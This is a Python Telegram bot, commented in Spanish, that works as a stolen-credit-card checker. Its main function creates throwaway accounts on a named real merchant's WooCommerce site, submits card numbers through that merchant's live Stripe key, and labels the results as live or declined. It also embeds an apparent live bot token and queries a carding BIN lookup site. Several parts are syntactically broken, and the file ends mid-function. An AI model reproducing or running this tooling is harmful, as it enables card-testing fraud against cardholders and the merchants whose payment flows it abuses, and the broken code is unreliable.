import telebot
import time
import threading
from telebot import types
import requests
import random
import re
import json
from datetime import datetime
import os
import html
import string
import logging

# Configuración del logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Token del bot
token = '8578030631:AAHI2X9ehFlRkjOcuid_ao3NPnEqk-AZZmg'
bot = telebot.TeleBot(token, parse_mode="HTML")

# Admin ID (solo para comandos especiales)
admin = 5541778617

# Variables globales
command_usage = {}
shown_users = set()
stopuser = {}
user_sessions = {}

# ========== SIN NINGUNA RESTRICCIÓN ==========
def group_access(func):
    def wrapper(message):
        return func(message)
    return wrapper

# Función para escapar caracteres HTML
def escape_html(text):
    if text is None:
        return ""
    return html.escape(str(text))

# ========== FUNCIÓN DE VERIFICACIÓN DE TARJETAS (STRIPE REAL) ==========

def check_card_stripe(cc_data):
    """
    Función para verificar tarjetas usando el método de Stripe/kidsafeuk
    """
    try:
        ccx = cc_data.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Formatear año
        if "20" in yy:
            yy = yy.split("20")[1]
        
        s = requests.session()
        hot = 'www.kidsafeuk.co.uk'
        
        # Función para obtener nonce de registro
        def get_nonce(s):
            try:
                res = s.get(f'https://{hot}/my-account/', timeout=15)
                match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', res.text)
                return match.group(1) if match else None
            except Exception as e:
                logger.error(f"Error getting nonce: {e}")
                return None
        
        # Función para registrar cuenta
        def register(s, nonce):
            username = ''.join(random.choices(string.ascii_lowercase, k=8))
            email = f'{username}{random.randint(100, 999)}@gmail.com'
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'origin': f'https://{hot}',
                'priority': 'u=0, i',
                'referer': f'https://{hot}/my-account/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            
            data = {
                'email': email,
                'password': password,
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            response = s.post(f'https://{hot}/my-account/', headers=headers, data=data)
            return response, email, password
        
        # Obtener nonce inicial
        nonce = get_nonce(s)
        if not nonce:
            return "❌ Error: No se pudo obtener el nonce de registro"
        
        # Registrar cuenta
        reg_response, email, password = register(s, nonce)
        
        # Crear payment method en Stripe
        stripe_headers = {
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        pay_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fd68d8e2c5f%3B+stripe-js-v3%2Fd68d8e2c5f%3B+payment-element%3B+deferred-intent%3B+autopm&key=pk_live_51AMFprJ3cP4COB5QTqTDfXeRz5rY2Ct24Whr2iwdqrrdlXAdx6gz4BrHmpSZH3ArFxKAo0ulhCQMaEXmzCBCR76100Og5H1Rw9&_stripe_version=2024-06-20'
        
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=pay_data)
        
        try:
            pm = stripe_response.json()['id']
        except Exception as e:
            error_msg = stripe_response.json().get('error', {}).get('message', 'Unknown error')
            return f"❌ Error creando payment method: {error_msg}"
        
        # Obtener nonce de ajax
        def get_ajax_nonce(s):
            try:
                res = s.get(f'https://{hot}/my-account/add-payment-method/', timeout=15)
                patterns = [r'"createAndConfirmSetupIntentNonce":"([^"]+)"']
                for p in patterns:
                    match = re.search(p, res.text)
                    if match: 
                        return match.group(1)
                return None
            except Exception as e:
                logger.error(f"Error getting ajax nonce: {e}")
                return None
        
        ajax_nonce = get_ajax_nonce(s)
        if not ajax_nonce:
            return "❌ Error: No se pudo obtener el ajax nonce"
        
        # Confirmar setup intent
        confirm_headers = {
            'origin': f'https://{hot}',
            'referer': f'https://{hot}/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        confirm_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        final_response = s.post(f'https://{hot}/wp-admin/admin-ajax.php', headers=confirm_headers, data=confirm_data)
        result_json = final_response.json()
        
        # Analizar resultado - CORREGIDO
        if 'data' in result_json and 'error' in result_json['data']:
            error_msg = result_json['data']['error']['message']
            
            # Clasificar errores comunes
            if "insufficient funds" in error_msg.lower() or "insufficient_funds" in error_msg.lower():
                return f"✅ <b>APPROVED - LIVE (Sin fondos)</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>\n📧 {email}\n🔑 {password}\n📝 {error_msg}"
            elif "incorrect_number" in error_msg.lower() or "invalid number" in error_msg.lower():
                return f"❌ <b>DECLINED - Número inválido</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            elif "expired" in error_msg.lower() or "expired_card" in error_msg.lower():
                return f"❌ <b>DECLINED - Tarjeta expirada</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            elif "cvc" in error_msg.lower() or "security code" in error_msg.lower():
                return f"❌ <b>DECLINED - CVV incorrecto</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            elif "do not honor" in error_msg.lower():
                return f"❌ <b>DECLINED - Do Not Honor</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            elif "pickup card" in error_msg.lower():
                return f"❌ <b>DECLINED - Pickup Card</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            elif "lost card" in error_msg.lower() or "stolen card" in error_msg.lower():
                return f"❌ <b>DECLINED - Tarjeta perdida/robada</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>"
            else:
                return f"❌ <b>DECLINED</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>\n📝 {error_msg}"
        else:
            return f"✅ <b>APPROVED - Válida</b>\n\n꒰⟡꒱ 𝗖𝗖: <code>{cc_data}</code>\n📧 {email}\n🔑 {password}"
            
    except Exception as e:
        logger.error(f"Error in check_card: {e}")
        return f"❌ Error en el proceso: {str(e)}"

# ========== SIMULACIÓN BRAINTREE ==========

def bran(cc):
    try:
        time.sleep(2)
        responses = [
            "CHARGE 2.00$",
            "insufficient funds",
            "card declined",
            "invalid card"
        ]
        return random.choice(responses)
    except Exception as e:
        return f"Error: {str(e)}"

# ========== SIMULACIÓN PAYPAL ==========

def pali(cc):
    try:
        time.sleep(2)
        responses = [
            "CHARGE 1.00$",
            "INSUFFICIENT_FUNDS",
            "CARD_DECLINED",
            "CVV2_FAILURE"
        ]
        return random.choice(responses)
    except Exception as e:
        return f"Error: {str(e)}"

# ========== FUNCIÓN PARA OBTENER INFO DE BIN ==========

def get_bin_info(bin_number):
    """Obtiene información del BIN"""
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            brand = escape_html(data.get("brand", "Unknown"))
            card_type = escape_html(data.get("type", "Unknown"))
            level = escape_html(data.get("level", "Unknown"))
            bank = escape_html(data.get("bank", "Unknown"))
            country_name = escape_html(data.get("country_name", "Unknown"))
            country_flag = escape_html(data.get("country_flag", "🏳️"))
            
            return f"""꒰⟡꒱ 𝗕𝗜𝗡: {brand} - {card_type} - {level}
꒰⟡꒱ 𝗕𝗔𝗡𝗞: {bank} - {country_flag}
꒰⟡꒱ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country_name} {country_flag}"""
        else:
            return "꒰⟡꒱ No hay información disponible"
    except:
        return "꒰⟡꒱ No hay información disponible"

# ========== FUNCIÓN PARA VALIDAR TARJETA (LUHN) ==========

def luhn_check(number):
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc):
    try:
        parts = [p for p in re.split(r'\D+', cc) if p != '']
        if len(parts) >= 4:
            pan = parts[0]
            mm = parts[1].zfill(2)
            yy = parts[2]
            cvc = parts[3]
            
            if len(yy) == 4 and yy.startswith('20'):
                pass
            elif len(yy) == 2:
                yy = '20' + yy
            
            is_amex = pan.startswith('34') or pan.startswith('37')
            expected_pan_len = 15 if is_amex else 16
            expected_cvc_len = 4 if is_amex else 3
            
            if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
                return None
            if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
                return None
            if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
                return None
            if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
                return None
            if not luhn_check(pan):
                return None
            
            # Formatear año a 4 dígitos para consistencia
            if len(yy) == 2:
                yy = '20' + yy
                
            return f"{pan}|{mm}|{yy}|{cvc}"
    except:
        return None
    return None

# ========== FUNCIÓN PARA VERIFICAR SUSCRIPCIÓN ==========

def check_subscription():
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("✅ Unirse al canal", url="https://t.me/snoopyrefs")
    check_btn = types.InlineKeyboardButton("🔄 Verificar", callback_data="check_sub")
    markup.add(btn, check_btn)
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_subscription_callback(call):
    user_id = call.from_user.id
    shown_users.add(user_id)
    bot.answer_callback_query(call.id, "✅ Verificado")
    bot.send_message(call.message.chat.id, "✅ Verificado correctamente. Usa /start para continuar.")

# ========== COMANDOS PRINCIPALES ==========

@bot.message_handler(commands=["start"])
@group_access
def start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    # Verificar suscripción (solo una vez)
    if user_id not in shown_users:
        shown_users.add(user_id)
        markup = check_subscription()
        bot.send_message(message.chat.id, '𓏲ּ Únete al canal para continuar.ᐟ.ᐟ', reply_markup=markup)
        return
    
    # Menú principal - CORREGIDO: AHORA CON 6 BOTONES
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton('✷ Stripe (Real)', callback_data='menu_sp')
    btn2 = types.InlineKeyboardButton('✷ Braintree ($2)', callback_data='menu_bt')
    btn3 = types.InlineKeyboardButton('✷ PayPal ($1)', callback_data='menu_pp')
    btn4 = types.InlineKeyboardButton('📊 Consultar BIN', callback_data='menu_bin')
    btn5 = types.InlineKeyboardButton('📚 Ayuda', callback_data='menu_help')
    btn6 = types.InlineKeyboardButton('👤 Mi ID', callback_data='menu_myid')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(
        message.chat.id,
        f"👋 <b>Hola {escape_html(user_name)}</b>\n\n"
        f"꒰⟡꒱ <b>Verificador de Tarjetas - Múltiples Gateways</b>\n\n"
        f"Select option from menu below:",
        reply_markup=markup
    )

@bot.message_handler(commands=['help'])
@group_access
def help_cmd(message):
    help_text = """📚 <b>COMANDOS </b>

/start - Main Menu
/help - Help menu
/myid - Check my ID

💳 <b>Verificación REAL:</b>
<code>/sp NUMERO|MES|AÑO|CVV</code> - Stripe (real)

💳 <b>Verification SIMULATED:</b>
<code>/cc NUMERO|MES|AÑO|CVV</code> - Braintree ($2)
<code>/pp NUMERO|MES|AÑO|CVV</code> - PayPal ($1)

📊 <b>Info BIN:</b>
<code>/bin 493471</code> - BIN Checker

📌 <b>Ejemplos:</b>
<code>/sp 4934719906225220|12|2026|987</code>
<code>/cc 4111111111111111|12|2025|123</code>
<code>/pp 4111111111111111|12|2025|123</code>

📁 <b>Mass Check:</b>
send archivo .txt con tarjetas"""
    
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['myid'])
@group_access
def myid(message):
    user_id = message.from_user.id
    bot.reply_to(
        message,
        f"📊 <b>Tu ID:</b> <code>{user_id}</code>\n<b>Chat ID:</b> <code>{message.chat.id}</code>",
        parse_mode="HTML"
    )

# ========== COMANDO /SP (STRIPE REAL) ==========

@bot.message_handler(commands=['sp'])
@group_access
def cmd_sp(message):
    user_id = message.from_user.id
    
    # Control de tiempo (cooldown)
    if user_id in command_usage:
        last_time = command_usage[user_id]
        diff = (datetime.now() - last_time).seconds
        if diff < 20:  # 20 segundos de cooldown para Stripe (es más lento)
            bot.reply_to(message, f"⏳ Espera {20-diff} segundos")
            return
    
    # Obtener la tarjeta del mensaje
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    
    if len(parts) < 2:
        bot.reply_to(
            message,
            "❌ <b>Formato incorrecto</b>\n\nUsa: <code>/sp NUMERO|MES|AÑO|CVV</code>\nEjemplo: <code>/sp 4934719906225220|12|2026|987</code>",
            parse_mode="HTML"
        )
        return
    
    card_data = parts[1].strip()
    
    # Validar formato con reg()
    cc_validado = reg(card_data)
    if not cc_validado:
        bot.reply_to(
            message,
            "❌ <b>Formato de tarjeta inválido</b>\n\n"
            "Usa: <code>NUMERO|MES|AÑO|CVV</code>\n"
            "Ejemplo: <code>4934719906225220|12|2026|987</code>",
            parse_mode="HTML"
        )
        return
    
    # Mensaje de proceso
    progress_msg = bot.reply_to(message, "⏳ <b>Verificando tarjeta con Stripe (real)...</b>", parse_mode="HTML")
    
    try:
        # Actualizar tiempo de uso
        command_usage[user_id] = datetime.now()
        
        # Obtener BIN para info adicional
        bin_number = card_data.split('|')[0][:6]
        
        # Realizar verificación
        result = check_card_stripe(cc_validado)
        
        # Obtener info BIN
        bin_info = get_bin_info(bin_number)
        
        # Combinar resultado
        final_result = result + "\n\n" + bin_info
        
        # Editar mensaje con resultado
        bot.edit_message_text(
            final_result,
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )
        
        logger.info(f"User {user_id} used /sp: {card_data}")
        
    except Exception as e:
        bot.edit_message_text(
            f"❌ <b>Error inesperado:</b> {escape_html(str(e))}",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )
        logger.error(f"Error handling /sp for user {user_id}: {e}")

# ========== COMANDO /CC (BRAINTREE - SIMULACIÓN) ==========

@bot.message_handler(commands=['cc'])
@group_access
def cmd_cc(message):
    user_id = message.from_user.id
    
    # Control de tiempo
    if user_id in command_usage:
        last_time = command_usage[user_id]
        diff = (datetime.now() - last_time).seconds
        if diff < 10:
            bot.reply_to(message, f"⏳ Espera {10-diff} segundos")
            return
    
    # Obtener la tarjeta del mensaje
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    
    if len(parts) < 2:
        bot.reply_to(
            message,
            "❌ <b>Formato incorrecto</b>\n\nUsa: <code>/cc NUMERO|MES|AÑO|CVV</code>\nEjemplo: <code>/cc 4111111111111111|12|2025|123</code>",
            parse_mode="HTML"
        )
        return
    
    card_data = parts[1].strip()
    
    # Validar formato con reg()
    cc_validado = reg(card_data)
    if not cc_validado:
        bot.reply_to(
            message,
            "❌ <b>Formato de tarjeta inválido</b>\n\n"
            "Usa: <code>NUMERO|MES|AÑO|CVV</code>",
            parse_mode="HTML"
        )
        return
    
    # Mensaje de proceso
    progress_msg = bot.reply_to(message, "⏳ <b>Verificando con Braintree...</b>", parse_mode="HTML")
    
    try:
        command_usage[user_id] = datetime.now()
        
        start_time = time.time()
        result = bran(cc_validado)
        elapsed = time.time() - start_time
        
        bin_info = get_bin_info(cc_validado[:6])
        username = escape_html(message.from_user.username or 'Anónimo')
        
        response = f"""✦ <b>#Braintree $2.00</b>
— — — — — — — — — — — — — — — 
<b>꒰⟡꒱ 𝗖𝗖:</b> <code>{escape_html(cc_validado)}</code>
<b>꒰⟡꒱ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{escape_html(result)}</code>
— — — — — — — — — — — — — — — 
{bin_info}
— — — — — — — — — — — — — — — 
<b>꒰⟡꒱ 𝗧𝗜𝗘𝗠𝗣𝗢:</b> {elapsed:.2f}s
<b>꒰⟡꒱ 𝗨𝗦𝗨𝗔𝗥𝗜𝗢:</b> @{username}"""
        
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML")
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {escape_html(str(e))}", chat_id=message.chat.id, message_id=progress_msg.message_id)

# ========== COMANDO /PP (PAYPAL - SIMULACIÓN) ==========

@bot.message_handler(commands=['pp'])
@group_access
def cmd_pp(message):
    user_id = message.from_user.id
    
    # Control de tiempo
    if user_id in command_usage:
        last_time = command_usage[user_id]
        diff = (datetime.now() - last_time).seconds
        if diff < 10:
            bot.reply_to(message, f"⏳ Espera {10-diff} segundos")
            return
    
    # Obtener la tarjeta del mensaje
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    
    if len(parts) < 2:
        bot.reply_to(
            message,
            "❌ <b>Formato incorrecto</b>\n\nUsa: <code>/pp NUMERO|MES|AÑO|CVV</code>\nEjemplo: <code>/pp 4111111111111111|12|2025|123</code>",
            parse_mode="HTML"
        )
        return
    
    card_data = parts[1].strip()
    
    # Validar formato con reg()
    cc_validado = reg(card_data)
    if not cc_validado:
        bot.reply_to(
            message,
            "❌ <b>Formato de tarjeta inválido</b>\n\n"
            "Usa: <code>NUMERO|MES|AÑO|CVV</code>",
            parse_mode="HTML"
        )
        return
    
    # Mensaje de proceso
    progress_msg = bot.reply_to(message, "⏳ <b>Verificando con PayPal...</b>", parse_mode="HTML")
    
    try:
        command_usage[user_id] = datetime.now()
        
        start_time = time.time()
        result = pali(cc_validado)
        elapsed = time.time() - start_time
        
        bin_info = get_bin_info(cc_validado[:6])
        username = escape_html(message.from_user.username or 'Anónimo')
        
        response = f"""⚝ <b>#PayPal $1.00</b>
— — — — — — — — — — — — — — — 
<b>꒰⟡꒱ 𝗖𝗖:</b> <code>{escape_html(cc_validado)}</code>
<b>꒰⟡꒱ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{escape_html(result)}</code>
— — — — — — — — — — — — — — — 
{bin_info}
— — — — — — — — — — — — — — — 
<b>꒰⟡꒱ 𝗧𝗜𝗘𝗠𝗣𝗢:</b> {elapsed:.2f}s
<b>꒰⟡꒱ 𝗨𝗦𝗨𝗔𝗥𝗜𝗢:</b> @{username}"""
        
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML")
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {escape_html(str(e))}", chat_id=message.chat.id, message_id=progress_msg.message_id)

# ========== COMANDO /BIN ==========

@bot.message_handler(commands=['bin'])
@group_access
def cmd_bin(message):
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    
    if len(parts) < 2:
        bot.reply_to(
            message,
            "❌ <b>Formato incorrecto</b>\n\nUsa: <code>/bin 493471</code>",
            parse_mode="HTML"
        )
        return
    
    bin_number = parts[1].strip()
    
    # Validar que sea un número de 6 dígitos
    if not re.match(r'^\d{6}$', bin_number):
        bot.reply_to(
            message,
            "❌ <b>BIN inválido</b>\n\nEl BIN debe tener exactamente 6 dígitos numéricos.",
            parse_mode="HTML"
        )
        return
    
    progress_msg = bot.reply_to(message, "⏳ <b>Consultando información del BIN...</b>", parse_mode="HTML")
    
    bin_info = get_bin_info(bin_number)
    
    bot.edit_message_text(
        bin_info,
        chat_id=message.chat.id,
        message_id=progress_msg.message_id,
        parse_mode="HTML"
    )

# ========== MANEJADORES DE CALLBACKS DEL MENÚ ==========

@bot.callback_query_handler(func=lambda call: call.data == 'menu_sp')
def menu_sp(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="✷ <b>Stripe - Verificación REAL</b>\n\n"
             "Usa: <code>/sp NUMERO|MES|AÑO|CVV</code>\n\n"
             "<b>Ejemplo:</b>\n"
             "<code>/sp 4934719906225220|12|2026|987</code>\n\n"
             "⚠️ Esta verificación es <b>real</b> usando Stripe.\n"
             "Las APPROVEDs incluirán email y contraseña.",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'menu_bt')
def menu_bt(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="✷ <b>Braintree $2.00</b>\n\n"
             "Usa: <code>/cc NUMERO|MES|AÑO|CVV</code>\n\n"
             "<b>Ejemplo:</b>\n"
             "<code>/cc 4111111111111111|12|2025|123</code>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'menu_pp')
def menu_pp(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="✷ <b>PayPal Custom $1.00</b>\n\n"
             "Usa: <code>/pp NUMERO|MES|AÑO|CVV</code>\n\n"
             "<b>Ejemplo:</b>\n"
             "<code>/pp 4111111111111111|12|2025|123</code>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'menu_bin')
def menu_bin(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📊 <b>Consultar BIN</b>\n\n"
             "Usa: <code>/bin 493471</code>\n\n"
             "<b>Ejemplo:</b>\n"
             "<code>/bin 493471</code>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'menu_help')
def menu_help(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    help_text = """📚 <b>HELP</b>

<b>Available commands:</b>
• <code>/sp</code> - Stripe (real)
• <code>/cc</code> - Braintree
• <code>/pp</code> - PayPal
• <code>/bin</code> - Consultar BIN
• <code>/myid</code> - Ver tu ID

<b>Formato tarjeta:</b>
<code>NUMERO|MES|AÑO|CVV</code>

<b>Example:</b>
<code>4934719906225220|12|2026|987</code>"""
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=help_text,
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'menu_myid')
def menu_myid(call):
    user_id = call.from_user.id
    username = call.from_user.username or "Sin username"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton('⬅️ Volver', callback_data='volver'))
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"👤 <b>YOUR INFORMATION</b>\n\n"
             f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
             f"👤 <b>Username:</b> @{username}\n"
             f"👑 <b>Admin:</b> {'✅ Sí' if user_id == admin else '❌ No'}",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == 'volver')
def volver(call):
    # Volver al menú principal
    user_name = call.from_user.first_name
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton('✷ Stripe (Real)', callback_data='menu_sp')
    btn2 = types.InlineKeyboardButton('✷ Braintree ($2)', callback_data='menu_bt')
    btn3 = types.InlineKeyboardButton('✷ PayPal ($1)', callback_data='menu_pp')
    btn4 = types.InlineKeyboardButton('📊 Consultar BIN', callback_data='menu_bin')
    btn5 = types.InlineKeyboardButton('📚 Ayuda', callback_data='menu_help')
    btn6 = types.InlineKeyboardButton('👤 Mi ID', callback_data='menu_myid')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=ftext=(
    f"<tg-emoji emoji-id='6025939738781814561'>🛍</tg-emoji> <b><i>W E L C O M E</i></b> <tg-emoji emoji-id='6025939738781814561'>🛍</tg-emoji>\n"
    f"<b><i>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</i></b>\n"
    f"<tg-emoji emoji-id='6026316531967726726'>🎁</tg-emoji> <b><i>Name →</i></b> {escape_html(user_name)} <tg-emoji emoji-id='6026292029179301727'>👑</tg-emoji>\n"
    f"⚡ <b>Status → <i>Online</i> &amp; <i>Ready</i></b> <tg-emoji emoji-id='6023903103944758376'>💝</tg-emoji>\n"
    f"<b><i>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</i></b>\n\n"
    f"<tg-emoji emoji-id='6025874094501662784'>☑</tg-emoji> <b><i>Use the menu below to get started</i></b>:",
        reply_markup=markup
    )

# ========== DETECCIÓN AUTOMÁTICA DE TARJETAS ==========

@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_text(message):
    # Ignorar comandos
    if message.text.startswith('/'):
        return
    
    text = message.text.strip()
    
    # Patrón para detectar tarjeta (números separados por |)
    if re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', text):
        # Validar con reg() primero
        cc_validado = reg(text)
        if cc_validado:
            markup = types.InlineKeyboardMarkup(row_width=2)
        btn_sp = types.InlineKeyboardButton("✷ Stripe", callback_data=f"verify_sp_{message.message_id}")
        btn_bt = types.InlineKeyboardButton("✷ Braintree", callback_data=f"verify_bt_{message.message_id}")
    btn_pp = types.InlineKeyboardButton("✷ PayPal", callback_data=f"verify_pp_{message.message_id}")
    btn_no = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_verify")
    markup.add(btn_sp, btn_bt, btn_pp, btn_no)
            
    bot.reply_to(
                message,
                f"📝 <b>¿Check this card?</b>\n\n<code>{text}</code>\n\nSelect  gateway:",
                reply_markup=markup,
                parse_mode="HTML"
            )
            
            # Guardar la tarjeta para usarla después
    user_sessions[message.message_id] = cc_validado

@bot.callback_query_handler(func=lambda call: call.data.startswith('verify_'))
def handle_verify_callback(call):
    parts = call.data.split('_')
    gateway = parts[1]  # sp, bt, pp
    message_id = int(parts[2])
    user_id = call.from_user.id
    
    if message_id in user_sessions:
        card_data = user_sessions[message_id]
        
        # Responder al callback
        bot.answer_callback_query(call.id, f"Verificando con {gateway.upper()}...")
        
        # Eliminar el mensaje de confirmación
        bot.delete_message(call.message.chat.id, call.message.message_id)
        
        # Crear mensaje de progreso
        progress_msg = bot.send_message(call.message.chat.id, f"⏳ <b>Verificando con {gateway.upper()}...</b>", parse_mode="HTML")
        
        try:
            # Actualizar tiempo de uso
            command_usage[user_id] = datetime.now()
            
            # Obtener BIN para info adicional
            bin_number = card_data.split('|')[0][:6]
            bin_info = get_bin_info(bin_number)
            
            if gateway == 'sp':
                # Stripe real
                result = check_card_stripe(card_data)
            elif gateway == 'bt':
                # Braintree simulado
                result = bran(card_data)
                result = f"✦ <b>#Braintree $2.00</b>\n\n<b>꒰⟡꒱ 𝗖𝗖:</b> <code>{card_data}</code>\n<b>꒰⟡꒱ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{result}</code>"
            elif gateway == 'pp':
                # PayPal simulado
                result = pali(card_data)
                result = f"⚝ <b>#PayPal $1.00</b>\n\n<b>꒰⟡꒱ 𝗖𝗖:</b> <code>{card_data}</code>\n<b>꒰⟡꒱ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘:</b> <code>{result}</code>"
            
            # Combinar resultado
            final_result = result + "\n\n" + bin_info
            
            # Actualizar mensaje
            bot.edit_message_text(
                final_result,
                chat_id=call.message.chat.id,
                message_id=progress_msg.message_id,
                parse_mode="HTML"
            )
            
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>Error:</b> {escape_html(str(e))}",
                chat_id=call.message.chat.id,
                message_id=progress_msg.message_id,
                parse_mode="HTML"
            )
        
        # Limpiar sesión
        del user_sessions[message_id]
    else:
        bot.answer_callback_query(call.id, "Error: Tarjeta no encontrada")

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_verify')
def handle_cancel_callback(call):
    bot.answer_callback_query(call.id, "Verificación cancelada")
    bot.delete_message(call.message.chat.id, call.message.message_id)

# ========== MANEJO DE ARCHIVOS ==========

@bot.message_handler(content_types=['document'])
@group_access
def handle_file(message):
    user_id = str(message.from_user.id)
    
    # Verificar si es un archivo .txt
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Unsupported archive, not .txt")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('✷ Stripe', callback_data=f'file_stripe_{user_id}'),
        types.InlineKeyboardButton('✷ Braintree', callback_data=f'file_bt_{user_id}'),
        types.InlineKeyboardButton('✷ PayPal', callback_data=f'file_pp_{user_id}'),
